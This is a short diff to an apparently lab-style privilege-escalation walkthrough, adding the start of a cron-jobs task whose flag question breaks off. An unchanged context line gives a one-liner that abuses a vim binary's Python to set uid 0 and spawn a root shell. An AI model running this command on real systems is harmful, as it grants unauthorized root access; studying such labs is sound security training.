@@ -86,3 +86,11 @@ Question 3: What is the content of the flag4.txt file?
 {Hint: /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'}
 
 
+
+Task 9 {Privilege Escalation: Cron Jobs}
+
+Question 1: How many cron jobs can you see on the target system?
+{{Hint: cat /etc/crontab}}
+
+Question 2: What is the content of the flag5.txt file? 
+{{
